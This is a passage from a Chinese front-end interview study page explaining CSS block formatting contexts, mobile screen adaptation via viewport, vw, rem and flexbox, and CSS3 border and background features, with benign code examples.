Context)，直译过来是格式化上下文，它是页面中的一块渲染区域，有一套渲染规则，决定了其子元素如何布局，以及和其他元素之间的关系和作用。常见的FC有BFC、IFC，还有GFC和FFC。</p>\n<p><strong>BFC</strong>(Block Formatting Context)块级格式化上下文，是用于布局块级盒子的一块渲染区域。<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context\">MDN上的解释</a>：BFC是Web页面 CSS 视觉渲染的一部分，用于决定块盒子的布局及浮动相互影响范围的一个区域。</p>\n<p>注意：一个BFC的范围包含创建该上下文元素的所有子元素，但<strong>不包括</strong>创建了新BFC的子元素的内部元素。这从另一方角度说明，一个元素不能同时存在于两个BFC中。因为如果一个元素能够同时处于两个BFC中，那么就意味着这个元素能与两个BFC中的元素发生作用，就违反了BFC的隔离作用。</p>\n</li>\n<li><p><strong>三种文档流的定位方案</strong></p>\n<p><strong>常规流(Normal flow)</strong></p>\n<ul>\n<li>在常规流中，盒一个接着一个排列;</li>\n<li>在块级格式化上下文里面， 它们竖着排列；</li>\n<li>在行内格式化上下文里面， 它们横着排列;</li>\n<li>当position为static或relative，并且float为none时会触发常规流；</li>\n<li>对于静态定位(static positioning)，position: static，盒的位置是常规流布局里的位置；</li>\n<li>对于相对定位(relative positioning)，position: relative，盒偏移位置由top、bottom、left、right属性定义。即使有偏移，仍然保留原有的位置，其它常规流不能占用这个位置。</li>\n</ul>\n<p><strong>浮动(Floats)</strong></p>\n<ul>\n<li>左浮动元素尽量靠左、靠上，右浮动同理</li>\n<li>这导致常规流环绕在它的周边，除非设置 clear 属性</li>\n<li>浮动元素不会影响块级元素的布局</li>\n<li>但浮动元素会影响行内元素的布局，让其围绕在自己周围，撑大父级元素，从而间接影响块级元素布局</li>\n<li>最高点不会超过当前行的最高点、它前面的浮动元素的最高点</li>\n<li>不超过它的包含块，除非元素本身已经比包含块更宽</li>\n<li>行内元素出现在左浮动元素的右边和右浮动元素的左边，左浮动元素的左边和右浮动元素的右边是不会摆放浮动元素的</li>\n</ul>\n<p><strong>绝对定位(Absolute positioning)</strong></p>\n<ul>\n<li>绝对定位方案，盒从常规流中被移除，不影响常规流的布局；</li>\n<li>它的定位相对于它的包含块，相关CSS属性：top、bottom、left、right；</li>\n<li>如果元素的属性position为absolute或fixed，它是绝对定位元素；</li>\n<li>对于position: absolute，元素定位将相对于上级元素中最近的一个relative、fixed、absolute，如果没有则相对于body；</li>\n</ul>\n</li>\n<li><p><strong>BFC触发方式</strong></p>\n<p>3.1 根元素，即HTML标签</p>\n<p>3.2 浮动元素：float值为<code>left</code>、<code>right</code></p>\n<p>3.3 overflow值不为 visible，为 <code>auto</code>、<code>scroll</code>、<code>hidden</code></p>\n<p>3.4 display值为 <code>inline-block</code>、<code>table-cell</code>、<code>table-caption</code>、<code>table</code>、<code>inline-table</code>、<code>flex</code>、<code>inline-flex</code>、<code>grid</code>、<code>inline-grid</code></p>\n<p>3.5 定位元素：position值为 <code>absolute</code>、<code>fixed</code></p>\n<p><strong>注意：</strong>display:table也可以生成BFC的原因在于Table会默认生成一个匿名的table-cell，是这个匿名的table-cell生成了BFC。</p>\n</li>\n<li><p><strong>约束规则</strong></p>\n<p>浏览器对BFC区域的约束规则：</p>\n<ol>\n<li>生成BFC元素的子元素会一个接一个的放置。</li>\n<li>垂直方向上他们的起点是一个包含块的顶部，两个相邻子元素之间的垂直距离取决于元素的margin特性。在BFC中相邻的块级元素的外边距会折叠(Mastering margin collapsing)</li>\n<li>生成BFC元素的子元素中，每一个子元素左外边距与包含块的左边界相接触（对于从右到左的格式化，右外边距接触右边界），即使浮动元素也是如此（尽管子元素的内容区域会由于浮动而压缩），除非这个子元素也创建了一个新的BFC（如它自身也是一个浮动元素）。</li>\n</ol>\n<p>规则解读：</p>\n<ol>\n<li>内部的Box会在垂直方向上一个接一个的放置</li>\n<li>内部的Box垂直方向上的距离由margin决定。（完整的说法是：属于同一个BFC的两个相邻Box的margin会发生折叠，不同BFC不会发生折叠。）</li>\n<li>每个元素的左外边距与包含块的左边界相接触（从左向右），即使浮动元素也是如此。（这说明BFC中子元素不会超出他的包含块，而position为absolute的元素可以超出他的包含块边界）</li>\n<li>BFC的区域不会与float的元素区域重叠</li>\n<li>计算BFC的高度时，浮动子元素也参与计算</li>\n</ol>\n</li>\n<li><p><strong>作用</strong></p>\n<p>BFC是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面元素，反之亦然。我们可以利用BFC的这个特性来做很多事。</p>\n<p>5.1 阻止元素被浮动元素覆盖</p>\n<p> 一个正常文档流的block元素可能被一个float元素覆盖，挤占正常文档流，因此可以设置一个元素的float、 display、position值等方式触发BFC，以阻止被浮动盒子覆盖。</p>\n<p>5.2 可以包含浮动元素</p>\n<p> 通过改变包含浮动子元素的父盒子的属性值，触发BFC，以此来包含子元素的浮动盒子。</p>\n<p>5.3 阻止因为浏览器因为四舍五入造成的多列布局换行的情况</p>\n<p> 有时候因为多列布局采用小数点位的width导致因为浏览器因为四舍五入造成的换行的情况，可以在最后一 列触发BFC的形式来阻止换行的发生。比如下面栗子的特殊情况</p>\n<p>5.4 阻止相邻元素的margin合并</p>\n<p> 属于同一个BFC的两个相邻块级子元素的上下margin会发生重叠，(设置writing-mode:tb-rl时，水平 margin会发生重叠)。所以当两个相邻块级子元素分属于不同的BFC时可以阻止margin重叠。<br>这里给任一个相邻块级盒子的外面包一个div，通过改变此div的属性使两个原盒子分属于两个不同的BFC，以此来阻止margin重叠。</p>\n</li>\n</ol>\n<h3 id=\"5、移动端适配方案\"><a href=\"#5、移动端适配方案\" class=\"headerlink\" title=\"5、移动端适配方案\"></a>5、移动端适配方案</h3><p><strong>参考答案：</strong></p>\n<p>适配思路</p>\n<p>设计稿（750*1334） —&gt; 开发 —&gt; 适配不同的手机屏幕，使其显得合理</p>\n<p>原则</p>\n<ol>\n<li>开发时方便，写代码时设置的值要和标注的 160px 相关</li>\n<li>方案要适配大多数手机屏幕，并且无 BUG</li>\n<li>用户体验要好，页面看着没有不适感</li>\n</ol>\n<p>思路</p>\n<ol>\n<li>写页面时，按照设计稿写固定宽度，最后再统一缩放处理，在不同手机上都能用</li>\n<li>按照设计稿的标准开发页面，在手机上部分内容根据屏幕宽度等比缩放，部分内容按需要变化，需要缩放的元素使用 rem, vw 相对单位，不需要缩放的使用 px</li>\n<li>固定尺寸+弹性布局，不需要缩放</li>\n</ol>\n<p><strong>viewport 适配</strong></p>\n<p>根据设计稿标准（750px 宽度）开发页面，写完后页面及元素自动缩小，适配 375 宽度的屏幕</p>\n<p>在 head 里设置如下代码</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=750,initial-scale=0.5<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>initial-scale &#x3D; 屏幕的宽度 &#x2F; 设计稿的宽度</p>\n<p>为了适配其他屏幕，需要动态的设置 initial-scale 的值</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">WIDTH</span> <span class=\"token operator\">=</span> <span class=\"token number\">750</span>\n    <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">mobileAdapter</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">let</span> scale <span class=\"token operator\">=</span> screen<span class=\"token punctuation\">.</span>width <span class=\"token operator\">/</span> <span class=\"token constant\">WIDTH</span>\n      <span class=\"token keyword\">let</span> content <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">width=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span><span class=\"token constant\">WIDTH</span><span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">, initial-scale=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>scale<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">, maximum-scale=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>scale<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">, minimum-scale=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>scale<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token template-punctuation string\">`</span></span>\n      <span class=\"token keyword\">let</span> meta <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'meta[name=viewport]'</span><span class=\"token punctuation\">)</span>\n      <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>meta<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        meta <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">createElement</span><span class=\"token punctuation\">(</span><span class=\"token string\">'meta'</span><span class=\"token punctuation\">)</span>\n        meta<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'viewport'</span><span class=\"token punctuation\">)</span>\n        document<span class=\"token punctuation\">.</span>head<span class=\"token punctuation\">.</span><span class=\"token function\">appendChild</span><span class=\"token punctuation\">(</span>meta<span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#125;</span>\n      meta<span class=\"token punctuation\">.</span><span class=\"token function\">setAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">mobileAdapter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    window<span class=\"token punctuation\">.</span>onorientationchange <span class=\"token operator\">=</span> mobileAdapter <span class=\"token comment\">//屏幕翻转时再次执行</span>\n  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>缺点就是边线问题，不同尺寸下，边线的粗细是不一样的（等比缩放后），全部元素都是等比缩放，实际显示效果可能不太好</p>\n<p><strong>vw 适配（部分等比缩放）</strong></p>\n<ol>\n<li>开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标注是基于此宽度标注）</li>\n<li>开始开发，对设计稿的标注进行转换，把px换成vw。比如页面元素字体标注的大小是32px，换成vw为 (100&#x2F;750)*32 vw</li>\n<li>对于需要等比缩放的元素，CSS使用转换后的单位</li>\n<li>对于不需要缩放的元素，比如边框阴影，使用固定单位px</li>\n</ol>\n<p>关于换算，为了开发方便，利用自定义属性，CSS变量</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">WIDTH</span> <span class=\"token operator\">=</span> <span class=\"token number\">750</span>\n    <span class=\"token comment\">//:root &#123; --width: 0.133333 &#125; 1像素等于多少 vw</span>\n    document<span class=\"token punctuation\">.</span>documentElement<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span><span class=\"token function\">setProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--width'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token number\">100</span> <span class=\"token operator\">/</span> <span class=\"token constant\">WIDTH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注意此时，meta 里就不要去设置缩放了</p>\n<p>业务代码里就可以写</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">header</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> <span class=\"token function\">calc</span><span class=\"token punctuation\">(</span>28vw * <span class=\"token function\">var</span><span class=\"token punctuation\">(</span>--width<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>实现了按需缩放</p>\n<p><strong>rem 适配</strong></p>\n<ol>\n<li>开发者拿到设计稿（假设设计稿尺寸为750px，设计稿的元素标是基于此宽度标注）</li>\n<li>开始开发，对设计稿的标注进行转换</li>\n<li>对于需要等比缩放的元素，CSS使用转换后的单位</li>\n<li>对于不需要缩放的元素，比如边框阴影，使用固定单位px</li>\n</ol>\n<p>假设设计稿的某个字体大小是 40px, 手机屏幕上的字体大小应为 420&#x2F;750*40 &#x3D; 22.4px (体验好)，换算成 rem（相对于 html 根节点，假设 html 的 font-size &#x3D; 100px,）则这个字体大小为 0.224 rem</p>\n<p>写样式时，对应的字体设置为 0.224 rem 即可，其他元素尺寸也做换算…</p>\n<p>但是有问题</p>\n<p>举个 ，设计稿的标注 是40px，写页面时还得去做计算，很麻烦（全部都要计算）</p>\n<p>能不能规定一下，看到 40px ,就应该写 40&#x2F;100 &#x3D; 0.4 rem,这样看到就知道写多少了（不用计算），此时的 html 的 font-size 就不能是 100px 了，应该为 (420*100)&#x2F;750 &#x3D; 56px，100为我们要规定的那个参数</p>\n<p>根据不同屏幕宽度，设置 html 的 font-size 值</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">WIDTH</span> <span class=\"token operator\">=</span> <span class=\"token number\">750</span> <span class=\"token comment\">//设计稿尺寸</span>\n    <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">setView</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n      document<span class=\"token punctuation\">.</span>documentElement<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>fontSize <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">100</span> <span class=\"token operator\">*</span> screen<span class=\"token punctuation\">.</span>width <span class=\"token operator\">/</span> <span class=\"token constant\">WIDTH</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'px'</span>\n    <span class=\"token punctuation\">&#125;</span>\n    window<span class=\"token punctuation\">.</span>onorientationchange <span class=\"token operator\">=</span> setView\n    <span class=\"token function\">setView</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>对于需要等比缩放的元素，CSS使用转换后的单位</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">header</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> .28rem<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>对于不需要缩放的元素，比如边框阴影，使用固定单位px</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">header > span.active</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span> 2px solid <span class=\"token function\">rgba</span><span class=\"token punctuation\">(</span>255<span class=\"token punctuation\">,</span> 255<span class=\"token punctuation\">,</span> 255<span class=\"token punctuation\">,</span> 0.3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>假设 html 的 font size &#x3D; 1px 的话，就可以写 28 rem 了，更方便了，但是浏览器对字体大小有限制，设为 1px 的话，在浏览器中是失效的，会以 12px（或者其他值） 做一个计算 , 就会得到一个很夸张的结果，所以可以把 html 写的大一些</p>\n<p>使用 sass 库时</p>\n<p>JS 处理还是一样的，但看着好看些</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token atrule\"><span class=\"token rule\">@function</span> <span class=\"token function\">px2rem</span><span class=\"token punctuation\">(</span>$px<span class=\"token punctuation\">)</span></span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token atrule\"><span class=\"token rule\">@return</span> $px * 1rem / 100<span class=\"token punctuation\">;</span></span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">header</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> <span class=\"token function\">px2rem</span><span class=\"token punctuation\">(</span>28<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>以上的三种适配方案，都是等比缩放，放到 ipad 上时（设计稿以手机屏幕设计的），页面元素会很大很丑，有些场景下，并不需要页面整体缩放（viewport 自动处理的也很好了），所以有时只需要合理的布局即可。</p>\n<p><strong>弹性盒适配（合理布局）</strong></p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>使用 flex 布局</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">section</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> flex<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>总结一下，什么样的页面需要做适配（等比缩放）呢</p>\n<ul>\n<li>页面中的布局是栅格化的</li>\n</ul>\n<p>换了屏幕后，到底有多宽多高很难去做设置，整体的都需要改变，所以需要整体的缩放</p>\n<ul>\n<li>头屏大图，宽度自适应，高度固定的话，对于不同的屏幕，形状就会发生改变（放到ipad上就变成长条了），宽度变化后，高度也要保持等比例变化</li>\n</ul>\n<p>以上所有的适配都是宽度的适配，但是在某些场景下，也会出现高度的适配</p>\n<p>比如大屏，需要适配很多的电视尺寸，要求撑满屏幕，不能有滚动条，此时若换个屏幕</p>\n<p>此时需要考虑小元素用 vh, 宽和高都用 vh 去表示，中间的大块去自适应，这就做到了大屏的适配，屏幕变小了，整体变小了（体验更好），中间这块撑满了屏幕</p>\n<p>对于更复杂的场景，需要更灵活考虑，没有一种适配方式可以囊括所有场景。</p>\n<h3 id=\"6、css3新特性\"><a href=\"#6、css3新特性\" class=\"headerlink\" title=\"6、css3新特性\"></a>6、css3新特性</h3><p><strong>参考答案</strong>：</p>\n<ol>\n<li><p><strong>CSS3 边框</strong></p>\n<p>在 css3 中新增的边框属性如下：</p>\n<p><strong>创建圆角</strong></p>\n<p><strong>语法：</strong> <code>border-radius : length length;</code></p>\n<p> length： 由浮点数字和单位标识符组成的长度值（如：20px）。不可为负值，如果为负值则与0展示效果一样。第一个值设置其水平半径，第二个值设置其垂直半径，如果第二个值省略则默认第二个值等于第一个值。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 1px solid<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* 设置每个圆角水平半径和垂直半径都为30px */</span>\n  <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 30px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>border-radius</code> 是4个角的缩写方法。四个角的表示顺序与<code>border</code>类似按照<code>border-top-left-radius</code>、<code>border-top-right-radius</code>、<code>border-bottom-right-radius</code>、<code>border-bottom-left-radius</code>的顺序来设置：</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 1px solid<span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* 如果 / 前后的值都存在，那么 / 前面的值设置其水平半径，/ 后面值设置其垂直半径，如果没有 / ，则水平和垂直半径相等 */</span>\n  <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 10px 15px 20px 30px / 20px 30px 10px 15px<span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">/* 上面写法等价于下面的写法，第一个值是水平半径，第二个值是垂直半径 */</span>\n  <span class=\"token property\">border-top-left-radius</span><span class=\"token punctuation\">:</span> 10px 20px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-top-right-radius</span><span class=\"token punctuation\">:</span> 15px 30px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-bottom-right-radius</span><span class=\"token punctuation\">:</span> 20px 10px<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">border-bottom-left-radius</span><span class=\"token punctuation\">:</span> 30px 15px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>border-radius</code> 指定不同数量的值遵循对角相等的原则，即指定了值的取指定值，没有指定值的与对角值相等，对角相等模型</p>\n<p><strong>边框阴影</strong></p>\n<p>通过属性<code>box-shadow</code> 向边框添加阴影。</p>\n<p><strong>语法：</strong> <code>&#123;box-shadow : [inset]  x-offset  y-offset  blur-radius  extension-radius  spread-radiuscolor&#125;</code></p>\n<p>说明：对象选择器 {box-shadow:[投影方式] X轴偏移量 Y轴偏移量 模糊半径 阴影扩展半径 阴影颜色}</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">/* 内阴影，向右偏移10px，向下偏移10px，模糊半径5px，阴影缩小10px */</span>\n  <span class=\"token property\">box-shadow</span><span class=\"token punctuation\">:</span> inset 10px 10px 5px -10px #888888<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>边框图片</strong></p>\n<p><strong>语法：</strong></p>\n<p><code>border-image : border-image-source || border-image-slice [ / border-image-width] || border-image-repeat</code></p>\n<p><code>border-image ： none | image [ number | percentage]&#123;1,4&#125; [ / border-width&gt;&#123;1,4&#125; ] ? [ stretch | repeat | round ]&#123;0,2&#125;</code></p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">border-image</span><span class=\"token punctuation\">:</span><span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>border.png<span class=\"token punctuation\">)</span></span> 30 30 round<span class=\"token punctuation\">;</span>\n\n  <span class=\"token property\">border-image</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>border.png<span class=\"token punctuation\">)</span></span> 20/10px repeat<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p><strong>CSS3 背景</strong></p>\n</li>\n</ol>\n<p><strong><code>background-size</code> 属性</strong></p>\n<p>在 CSS3 之前，背景图片的尺寸是由图片的实际尺寸决定的。在 CSS3 中，可以设置背景图片的尺寸，这就允许我们在不同的环境中重复使用背景图片。可以像素或百分比规定尺寸。如果以百分比规定尺寸，那么尺寸相对于父元素的宽度和高度。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">div</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">background</span><span class=\"token punctuation\">:</span><span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span>bg_flower.gif<span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span>\n  <span class=\"token comment\">/* 通过像素规定尺寸 */</span>\n  <span class=\"token property\">background-size</span><span class=\"token punctuation\">:</span>63px 100px<span class=\"token punctuation\">;</span>\n\n  <span class=\"token comment\">/* 通过百分比规定尺寸 */</span>\n  <span class=\"token property\">background-size</span><span class=\"token punctuation\">:</span>100% 50%<span class=\"token punctuation\">;</span>\n  <span class=\"token property\">background-repeat</span><span class=\"token punctuation\">:</span>no-repeat<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong><code>background-origin</code> 属性</strong></p>\n<p>规定背景图片的定位区域，背景图片可以放置于 <code>content-box</code>、<code>padding-box</code> 或 <code>border-box</code> 区域，</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token 